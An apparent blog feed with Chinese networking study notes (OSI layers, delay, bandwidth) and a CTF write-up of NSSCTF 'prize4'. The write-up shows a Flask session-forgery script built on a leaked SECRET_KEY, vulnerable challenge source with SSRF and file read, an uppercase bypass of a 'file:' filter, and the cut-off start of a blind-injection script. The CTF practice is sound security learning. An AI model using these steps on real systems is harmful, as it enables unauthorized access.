        <content type="html"><![CDATA[<h2 id="计算机网络分层结构"><a href="#计算机网络分层结构" class="headerlink" title="计算机网络分层结构"></a>计算机网络分层结构</h2><p><img src="/2022/07/07/2022/7/day3/image-20220707155459893.png" alt="image-20220707155459893"></p><p>综合参考得到5层的体系结构</p><h3 id="1-osi参考模型怎么来的"><a href="#1-osi参考模型怎么来的" class="headerlink" title="1.osi参考模型怎么来的"></a>1.osi参考模型怎么来的</h3><p>为了解决计算机网络复杂的大问题=》分层结构（按功能）</p><p>目的：支持异构网络系统的互联互通（世界各地的大家都能联系）</p><p><img src="/2022/07/07/2022/7/day3/image-20220707155801240.png" alt="image-20220707155801240"></p><p>理论成功，市场失败</p><h3 id="2-OSI七层"><a href="#2-OSI七层" class="headerlink" title="2.OSI七层"></a>2.OSI七层</h3><img src="/2022/07/07/2022/7/day3/image-20220707160007565.png" alt="image-20220707160007565" style="zoom:50%;"><p>顺口溜：一个叫淑惠的女生试用物联网</p><img src="/2022/07/07/2022/7/day3/image-20220707160053038.png" alt="image-20220707160053038" style="zoom:50%;"><p>每层完成特定的功能</p><h3 id="3-解释通信过程"><a href="#3-解释通信过程" class="headerlink" title="3.解释通信过程"></a>3.解释通信过程</h3><p><img src="/2022/07/07/2022/7/day3/image-20220707160206115.png" alt="image-20220707160206115"></p><p>A和B的通信</p><p><img src="/2022/07/07/2022/7/day3/image-20220707160452108.png" alt="image-20220707160452108"></p><p>中间系统自下向上是还原看一下之前具体做了哪些操作</p><p>A和B共同有相同4层，实现端到端的通信</p><p>而下面是点到点的通信</p><p><img src="/2022/07/07/2022/7/day3/image-20220707160811982.png" alt="image-20220707160811982"></p><img src="/2022/07/07/2022/7/day3/image-20220707160841544.png" alt="image-20220707160841544" style="zoom:50%;"><p>头部或者首部：控制信息，比如规定</p><p>往下形成7的PDU，新头部H6</p><p>以此类推</p><img src="/2022/07/07/2022/7/day3/image-20220707161033742.png" alt="image-20220707161033742" style="zoom:50%;"><p>数据链路层（本身字旧比较多）要多处理</p><p>物理层是傻瓜层，不添加了，就是把前面的数据进行一下转换到01这样形式</p><p><img src="/2022/07/07/2022/7/day3/image-20220707161207662.png" alt="image-20220707161207662"></p><h2 id="1、应用层"><a href="#1、应用层" class="headerlink" title="1、应用层"></a>1、应用层</h2><p><img src="/2022/07/07/2022/7/day3/image-20220707161401942.png" alt="image-20220707161401942"></p><p>比如浏览器、qq</p><p>记事本不需要联网，就不算</p><img src="/2022/07/07/2022/7/day3/image-20220707161434416.png" alt="image-20220707161434416" style="zoom:25%;"><p><img src="/2022/07/07/2022/7/day3/image-20220707161517828.png" alt="image-20220707161517828"></p><h2 id="2、表示层"><a href="#2、表示层" class="headerlink" title="2、表示层"></a>2、表示层</h2><p><img src="/2022/07/07/2022/7/day3/image-20220707161542913.png" alt="image-20220707161542913"></p><p>功能</p><p>1数据格式变化（翻译官，中文转成英文的感觉）</p><p>比如将比特流转换成可以看见的jpg</p><p>2数据加密解密</p><p>防止被抓包分析</p><p>3数据压缩和恢复</p><p>比如一开始网络聊天的图像太大，就先压缩后面到接受端恢复</p><h2 id="3、会话层"><a href="#3、会话层" class="headerlink" title="3、会话层"></a>3、会话层</h2><p><img src="/2022/07/07/2022/7/day3/image-20220707161923971.png" alt="image-20220707161923971"></p><p><img src="/2022/07/07/2022/7/day3/image-20220707162017289.png" alt="image-20220707162017289"></p><p><img src="/2022/07/07/2022/7/day3/image-20220707162050366.png" alt="image-20220707162050366"></p><p>同时打开网页两个</p><p>建立了两个会话，对电影页面的影响不会对百度影响</p><p>功能</p><p>功能一：建立、管理、终止会话</p><p><img src="/2022/07/07/2022/7/day3/image-20220707162313535.png" alt="image-20220707162313535"></p><h2 id="4、传输层"><a href="#4、传输层" class="headerlink" title="4、传输层"></a>4、传输层</h2><p><img src="/2022/07/07/2022/7/day3/image-20220707162427087.png" alt="image-20220707162427087"></p><p>进程间的通信，每个进程分配端口号</p><p><img src="/2022/07/07/2022/7/day3/image-20220707162617205.png" alt="image-20220707162617205"></p><p>记忆：可差也能留用？</p><p>可靠：有确认机制</p><p>不可靠：不用连接、不用在意有没有到达，没有确认机制</p><p>纠正错误</p><p>控制发送方的速度：比如接收方快忙不过来，会让对方慢一点</p><p><img src="/2022/07/07/2022/7/day3/image-20220707162958966.png" alt="image-20220707162958966"></p><p><img src="/2022/07/07/2022/7/day3/image-20220707163119776.png" alt="image-20220707163119776"></p><p>qq、微信同时使用服务</p><p>根据端口号来确定报文给谁，端口1的就是qq的报文就是给qq</p><p>协议：TCP、UDP</p><h2 id="5、网络层"><a href="#5、网络层" class="headerlink" title="5、网络层"></a>5、网络层</h2><p><img src="/2022/07/07/2022/7/day3/image-20220707163309368.png" alt="image-20220707163309368"></p><p><img src="/2022/07/07/2022/7/day3/image-20220707163323379.png" alt="image-20220707163323379"></p><p>路由选择：最佳路径</p><p>流量控制：速度，对于发送方的速度</p><p>差错控制</p><p>拥塞控制：整体速度、宏观控制</p><p><img src="/2022/07/07/2022/7/day3/image-20220707163536606.png" alt="image-20220707163536606"></p><h2 id="6、数据链路层"><a href="#6、数据链路层" class="headerlink" title="6、数据链路层"></a>6、数据链路层</h2><p><img src="/2022/07/07/2022/7/day3/image-20220707163600262.png" alt="image-20220707163600262"></p><p>传输单位是帧</p><p><img src="/2022/07/07/2022/7/day3/image-20220707163753392.png" alt="image-20220707163753392"></p><p><img src="/2022/07/07/2022/7/day3/image-20220707163835015.png" alt="image-20220707163835015"></p><h2 id="7、物理层"><a href="#7、物理层" class="headerlink" title="7、物理层"></a>7、物理层</h2><p>比特流转换为电信号进行传输</p><p><img src="/2022/07/07/2022/7/day3/image-20220707163920737.png" alt="image-20220707163920737"></p><p><img src="/2022/07/07/2022/7/day3/image-20220707163951290.png" alt="image-20220707163951290"></p><p><img src="/2022/07/07/2022/7/day3/image-20220707164231183.png" alt="image-20220707164231183"></p><p>单工是单方向</p><p>中间：可以当发送方或者接收方，但不能同时发送</p><p>双工是同时双方向（可以又接受又发送）</p><p>脑图时刻</p><p><img src="/2022/07/07/2022/7/day3/image-20220707164254426.png" alt="image-20220707164254426"></p><h2 id="TCP-IP模型"><a href="#TCP-IP模型" class="headerlink" title="TCP/IP模型"></a>TCP/IP模型</h2><p><img src="/2022/07/07/2022/7/day3/image-20220707172357937.png" alt="image-20220707172357937"></p><p>相同点</p><p>1.都分层</p><p>2.基于独立的协议栈的概念</p><p>3.可以实现异构网络互联</p><p>不同点</p><p>1.OSI定义三点：服务、协议、接口</p><p>2.OSI先出现，参考模型先于协议发明，不偏向特定协议</p><p>3.TCP/IP设计之初就考虑到异构网互联问题，将IP作为重要层次</p><p>4.<img src="/2022/07/07/2022/7/day3/image-20220707172852519.png" alt="image-20220707172852519"></p><p>记忆：对角线一个相等，另一个相反</p><p><img src="/2022/07/07/2022/7/day3/image-20220707172906459.png" alt="image-20220707172906459"></p><h2 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h2><p>综合了两种模型优点</p><p><img src="/2022/07/07/2022/7/day3/image-20220707173208532.png" alt="image-20220707173208532"></p><p>数据封装与解封装</p><p><img src="/2022/07/07/2022/7/day3/image-20220707173348500.png" alt="image-20220707173348500"></p><p><img src="/2022/07/07/2022/7/day3/image-20220707173430429.png" alt="image-20220707173430429"></p><h2 id="第一章知识总结"><a href="#第一章知识总结" class="headerlink" title="第一章知识总结"></a>第一章知识总结</h2><p><img src="/2022/07/07/2022/7/day3/image-20220708090853122.png" alt="image-20220708090853122"></p><p>自己将知识导图完善</p><p>标准化工作及相关组织记得ISO这个组织就好</p><p>重要程度看数字1和2</p>]]></content>
      
      
      <categories>
          
          <category> 计算机考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时延</title>
      <link href="/2022/07/06/2022/7/day2/"/>
      <url>/2022/07/06/2022/7/day2/</url>
      
        <content type="html"><![CDATA[<h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>常考传输、传播时延</p><p><img src="/2022/07/06/2022/7/day2/image-20220706160020903.png" alt="image-20220706160020903"></p><h3 id="发送（传输）时延"><a href="#发送（传输）时延" class="headerlink" title="发送（传输）时延"></a>发送（传输）时延</h3><img src="/2022/07/06/2022/7/day2/image-20220706160109630.png" alt="image-20220706160109630" style="zoom:50%;"><img src="/2022/07/06/2022/7/day2/image-20220706160130573.png" alt="image-20220706160130573" style="zoom:50%;"><h3 id="传播时延"><a href="#传播时延" class="headerlink" title="传播时延"></a>传播时延</h3><p><img src="/2022/07/06/2022/7/day2/image-20220706160310616.png" alt="image-20220706160310616"></p><p><img src="/2022/07/06/2022/7/day2/image-20220706160334084.png" alt="image-20220706160334084"></p><p>电磁波作为载体带着比特流进行传输</p><p>所以看电磁波的传播速率</p><h3 id="排队时延"><a href="#排队时延" class="headerlink" title="排队时延"></a>排队时延</h3><p>等待输入/输出链路可用</p><h3 id="处理时延"><a href="#处理时延" class="headerlink" title="处理时延"></a>处理时延</h3><p>检错、找出口</p><p>想例子：机场安检</p><p>安检的履带检查物品，如手机、电脑、行李。。。。</p><h2 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h2><p>式子：时延带宽积 = 传播时延 x 带宽</p><p><img src="/2022/07/06/2022/7/day2/image-20220706161050199.png" alt="image-20220706161050199"></p><p><img src="/2022/07/06/2022/7/day2/image-20220706161126773.png" alt="image-20220706161126773"></p><p>比如上面图片还在链路上的比特</p><h2 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" title="往返时延RTT"></a>往返时延RTT</h2><p><img src="/2022/07/06/2022/7/day2/image-20220706161247639.png" alt="image-20220706161247639"></p><p>从上图看出往返时延为30ms左右</p><p><img src="/2022/07/06/2022/7/day2/image-20220706161355125.png" alt="image-20220706161355125"></p><p>末端处理：接收方进行处理</p><h2 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h2><p>1.信道利用率</p><p>2.网络利用率</p><p>主机之间链路上有多少时间有数据流</p><p><img src="/2022/07/06/2022/7/day2/image-20220706161602181.png" alt="image-20220706161602181"></p><p>数据流大，就像车道上车太多会堵车</p><p>堵车就车走的比平时慢了</p><p><img src="/2022/07/06/2022/7/day2/image-20220706161725098.png" alt="image-20220706161725098"></p><h2 id="脑图时刻"><a href="#脑图时刻" class="headerlink" title="脑图时刻"></a>脑图时刻</h2><p><img src="/2022/07/06/2022/7/day2/image-20220706161749547.png" alt="image-20220706161749547"></p><h2 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h2><h3 id="为什么分层？"><a href="#为什么分层？" class="headerlink" title="为什么分层？"></a>为什么分层？</h3><p><img src="/2022/07/06/2022/7/day2/image-20220706162049724.png" alt="image-20220706162049724"></p><p><img src="/2022/07/06/2022/7/day2/image-20220706162152310.png" alt="image-20220706162152310"></p><p>大致以上五点</p><p>为了解决上面的问题（复杂）</p><p>大问题划分为小问题</p><h3 id="怎么分层？"><a href="#怎么分层？" class="headerlink" title="怎么分层？"></a>怎么分层？</h3><p>快递八二年拉菲酒的例子</p><h4 id="1-实体"><a href="#1-实体" class="headerlink" title="1.实体"></a>1.实体</h4><p><img src="/2022/07/06/2022/7/day2/image-20220706162414996.png" alt="image-20220706162414996"></p><p>比如酒看作实体</p><h4 id="2-协议"><a href="#2-协议" class="headerlink" title="2.协议"></a>2.协议</h4><p>对等实体之间才有协议</p><p><img src="/2022/07/06/2022/7/day2/image-20220706162515768.png" alt="image-20220706162515768"></p><h4 id="3-服务"><a href="#3-服务" class="headerlink" title="3.服务"></a>3.服务</h4><img src="/2022/07/06/2022/7/day2/image-20220706162554374.png" alt="image-20220706162554374" style="zoom:50%;"><h3 id="分层基本原则"><a href="#分层基本原则" class="headerlink" title="分层基本原则"></a>分层基本原则</h3><p><img src="/2022/07/06/2022/7/day2/image-20220706162823190.png" alt="image-20220706162823190"></p><h3 id="正式认识分层"><a href="#正式认识分层" class="headerlink" title="正式认识分层"></a>正式认识分层</h3><p><img src="/2022/07/06/2022/7/day2/image-20220706162911547.png" alt="image-20220706162911547"></p><p><img src="/2022/07/06/2022/7/day2/image-20220706163205801.png" alt="image-20220706163205801"></p><p>详细例子解释</p><p><img src="/2022/07/06/2022/7/day2/image-20220706163328575.png" alt="image-20220706163328575"></p><p>不断得到pdu协议数据单元</p><h2 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h2><p><img src="/2022/07/06/2022/7/day2/image-20220706163531134.png" alt="image-20220706163531134"></p><p>3向4提供自己的，也有更下面的1、2功能向4提供</p><p><img src="/2022/07/06/2022/7/day2/image-20220706163602338.png" alt="image-20220706163602338"></p><p>3和4之间有，和5没有</p><p><img src="/2022/07/06/2022/7/day2/image-20220706163640765.png" alt="image-20220706163640765"></p><p>厂家自己设计一些软件、硬件</p><p><img src="/2022/07/06/2022/7/day2/image-20220706163711313.png" alt="image-20220706163711313"></p><h2 id="脑图时刻-1"><a href="#脑图时刻-1" class="headerlink" title="脑图时刻"></a>脑图时刻</h2><p><img src="/2022/07/06/2022/7/day2/image-20220706163820282.png" alt="image-20220706163820282"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概念、组成、功能和分类</title>
      <link href="/2022/07/05/2022/7/day1/"/>
      <url>/2022/07/05/2022/7/day1/</url>
      
        <content type="html"><![CDATA[<h2 id="概念、组成、功能和分类"><a href="#概念、组成、功能和分类" class="headerlink" title="概念、组成、功能和分类"></a>概念、组成、功能和分类</h2><h3 id="1-怎么学习计算机网络"><a href="#1-怎么学习计算机网络" class="headerlink" title="1.怎么学习计算机网络"></a>1.怎么学习计算机网络</h3><img src="/2022/07/05/2022/7/day1/image-20220705191804871.png" style="zoom:50%;"><h3 id="2-概念"><a href="#2-概念" class="headerlink" title="2.概念"></a>2.概念</h3><p><img src="/2022/07/05/2022/7/day1/image-20220705191905918.png" alt="image-20220705191905918"></p><p><img src="/2022/07/05/2022/7/day1/image-20220705191954921.png" alt="image-20220705191954921"></p><p>通信设备：比如路由器、路由器                                                               线路：将系统和通信设备两者联系的介质之类的</p><p>计算机网络是互连的、自治的的计算机集合（互连：互联互通 通信链路，自治：无主从关系）</p><h3 id="3-功能"><a href="#3-功能" class="headerlink" title="3.功能"></a>3.功能</h3><p><img src="/2022/07/05/2022/7/day1/image-20220705192609511.png"></p><h3 id="4-组成"><a href="#4-组成" class="headerlink" title="4.组成"></a>4.组成</h3><p><img src="/2022/07/05/2022/7/day1/image-20220705192701300.png"></p><h3 id="5-工作方式"><a href="#5-工作方式" class="headerlink" title="5.工作方式"></a>5.工作方式</h3><p>边缘、核心</p><p><img src="/2022/07/05/2022/7/day1/image-20220705192851544.png"></p><h3 id="6-功能组成"><a href="#6-功能组成" class="headerlink" title="6.功能组成"></a>6.功能组成</h3><p><img src="/2022/07/05/2022/7/day1/image-20220705193009747.png"></p><p>一个是处理、一个是传输</p><h3 id="7-分类"><a href="#7-分类" class="headerlink" title="7.分类"></a>7.分类</h3><p><img src="/2022/07/05/2022/7/day1/image-20220705193510843.png"></p><h2 id="脑图时刻"><a href="#脑图时刻" class="headerlink" title="脑图时刻"></a>脑图时刻</h2><p><img src="/2022/07/05/2022/7/day1/image-20220705193557143.png" alt="image-20220705193557143"></p><h2 id="标准化工作"><a href="#标准化工作" class="headerlink" title="标准化工作"></a>标准化工作</h2><p><img src="/2022/07/05/2022/7/day1/image-20220705193816850.png" alt="image-20220705193816850"></p><p><img src="/2022/07/05/2022/7/day1/image-20220705193847353.png" alt="image-20220705193847353"></p><p>RFC——因特网的标准形式</p><h2 id="脑图时刻-1"><a href="#脑图时刻-1" class="headerlink" title="脑图时刻"></a>脑图时刻</h2><p><img src="/2022/07/05/2022/7/day1/image-20220705194344110.png" alt="image-20220705194344110"></p><h3 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h3><p><img src="/2022/07/05/2022/7/day1/image-20220705205738291.png" alt="image-20220705205738291"></p><p>10的三次方</p><p><img src="/2022/07/05/2022/7/day1/image-20220705205929459.png" alt="image-20220705205929459"></p><p>2的10次方</p><h3 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h3><p>单位：Hz</p><p>网络的通信线路传送数据的能力</p><p><img src="/2022/07/05/2022/7/day1/image-20220705210121005.png" alt="image-20220705210121005"></p><p>带宽变大，单位时间内传输的数据更多了</p><h3 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h3><p>单位时间内通过某个网络（或信道、接口）的数据量</p><p>单位：kb/s，kb/s，Mb/s</p><p><img src="/2022/07/05/2022/7/day1/image-20220705211158716.png" alt="image-20220705211158716"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-prize4</title>
      <link href="/2022/03/05/2022/3/NSSCTF-prize4/"/>
      <url>/2022/03/05/2022/3/NSSCTF-prize4/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    尝试做NSS平台上的一道prize题</p><p>​    恰好标签为sql盲注，就通过这道题对盲注加深理解</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305185431322.png" alt="image-20220305185431322"></p><p>打开后是一个输入框</p><p>师傅提示说，看到url就要联想到ssrf</p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305185641388.png" alt="image-20220305185641388"></p><p>但从返回的内容来看，这并不是ssrf，因为回显为非管理员的权限</p><p>点击超链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getkey</span>():</span><br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;GET&quot;</span>:<br>        session[<span class="hljs-string">&quot;key&quot;</span>]=SECRET_KEY<br></code></pre></td></tr></table></figure><p>感觉是flask框架，并且有关键字SECRET_KEY</p><p>这里就是第一个知识点：secret_key伪造session来进行越权</p><p>文章：<a href="https://www.cnblogs.com/Cl0ud/p/12176979.html">secret_key伪造session来进行越权 - 春告鳥 - 博客园 (cnblogs.com)</a></p><p>我们的目标就是伪造出admin的seesion来登录</p><p>回到刚才超链接跳转得到的代码</p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190152366.png" alt="image-20220305190152366"></p><p>师傅是用更换请求方式的方法</p><p>将GET更改为HEAD</p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190637134.png" alt="image-20220305190637134"></p><p>到jwt在线网站解密</p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190708643.png" alt="image-20220305190708643"></p><p>得到key：c5d0ffab-889c-4b55-8595-98872036da0d</p><p>然后挺离谱的，我按照参考文章使用github上的脚本跑的jwt都是错的==</p><p>使用哔哩哔哩视频讲解的脚本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;6247a6c6-4f64-4a5c-a7c1-adbe29ac445a&#x27;</span><br><br>@app.route(&quot;/&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])<br>def <span class="hljs-keyword">login</span>():<br>    <span class="hljs-keyword">session</span>[&quot;admin&quot;] = <span class="hljs-keyword">True</span><br>    <span class="hljs-keyword">return</span> request.full_path<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305204836153.png" alt="image-20220305204836153"></p><p>伪造访问成功</p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305204906227.png" alt="image-20220305204906227"></p><p>源码扒下来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, url_for,redirect,render_template_string<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> flag <br><br>SECRET_KEY=str(uuid.uuid4())<br><br>app = Flask(__name__)<br>app.config.update(dict(<br>    SECRET_KEY=SECRET_KEY,<br>))<br><br><span class="hljs-comment">#src in /app</span><br><br><span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><br><span class="hljs-meta">@app.route(&#x27;/index&#x27;,methods=[&#x27;GET&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(&#x27;/get_data&#x27;, methods=[&quot;GET&quot;,&#x27;POST&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>():</span><br>    data = request.form.get(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>)<br>    <span class="hljs-keyword">if</span> type(data) <span class="hljs-keyword">is</span> str:<br>        data=data.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>    url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;http://127.0.0.1:8888/&#x27;</span>)<br>    <span class="hljs-keyword">if</span> data <span class="hljs-keyword">and</span> url:<br>        session[<span class="hljs-string">&#x27;data&#x27;</span>] = data<br>        session[<span class="hljs-string">&#x27;url&#x27;</span>] = url<br>        session[<span class="hljs-string">&quot;admin&quot;</span>]=<span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;home&#x27;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;/&#x27;</span>))<br><br><span class="hljs-meta">@app.route(&#x27;/home&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home</span>():</span><br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-literal">False</span>):<br>        <span class="hljs-keyword">return</span> render_template_string(open(__file__).read())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;home.html&quot;</span>,data=session.get(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;Not find data...&#x27;</span>))<br><br><span class="hljs-meta">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getkey</span>():</span><br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;GET&quot;</span>:<br>        session[<span class="hljs-string">&quot;key&quot;</span>]=SECRET_KEY<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&#x27;&#x27;@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-string">def getkey():</span><br><span class="hljs-string">    if request.method != &quot;GET&quot;:</span><br><span class="hljs-string">        session[&quot;key&quot;]=SECRET_KEY&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-meta">@app.route(&#x27;/get_hindd_result&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_hindd_result</span>():</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;data&#x27;</span>] <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file:&#x27;</span> <span class="hljs-keyword">in</span> session[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no no no&quot;</span><br>        data=(session[<span class="hljs-string">&#x27;data&#x27;</span>]).decode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>        url_text=urllib.request.urlopen(session[<span class="hljs-string">&#x27;url&#x27;</span>]).read().decode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>        <span class="hljs-keyword">if</span> url_text <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> data <span class="hljs-keyword">in</span> url_text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;you get it&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;what ???&quot;</span><br><br><span class="hljs-meta">@app.route(&#x27;/getflag&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag</span>():</span><br>    res = flag.waf(request)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure><p>视频里atao师傅说看见返回内容的不同要想到布尔盲注</p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305205042249.png" alt="image-20220305205042249"></p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305210228558.png" alt="image-20220305210228558"></p><p>在get_hindd_result类中可能存在任意文件读取</p><p>file被过滤了，但后面证明大写就可以绕过</p><p>atao师傅的脚本</p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305210410183.png" alt="image-20220305210410183"></p><p>我用到的是另一位师傅的脚本</p><p>[<a href="https://www.wolai.com/k1he/pDVkq5wFGEAJYaUgPFKiu5">NSSCTF]prize4(ssrf+盲注) (wolai.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: k1he</span><br><span class="hljs-comment"># @Date:   2021-09-23 09:10:09</span><br><span class="hljs-comment"># @Last Modified by:   k1he</span><br><span class="hljs-comment"># @Last Modified time: 2021-09-27 22:31:49</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28062/get_data&quot;</span><br>letters = <span 